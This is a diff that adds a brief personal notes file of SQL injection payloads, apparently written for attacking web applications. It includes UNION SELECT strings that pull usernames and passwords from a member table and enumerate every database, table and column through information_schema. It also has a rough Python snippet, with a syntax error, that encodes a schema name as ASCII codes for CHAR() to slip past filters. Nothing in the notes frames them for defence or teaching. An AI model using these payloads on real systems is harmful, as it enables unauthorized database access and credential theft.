@@ -1,0 +1,10 @@
+-1 union select username, password from Member_Brute_Force.db_default
+find db:name and table:name
+Member find: 1 AND 1=2 union select table_schema, table_name from information_schema.tables -- this is find all db:names and all table names in db
+			 1 AND 1=2 union select table_name, column_name from information_schema.columns -- this is all tables and all field deepend
+			 1 AND 1=2 union select table_name, column_name from information_schena.schemata where table_schema=CHAR(name of db in ASCII code) -- find someone db with all tables and fields deepend
+Prog for convert char to ascii:
+	arr = []
+	for i in "Name schema"
+		arr.append(ord(i))
+	print(arr)
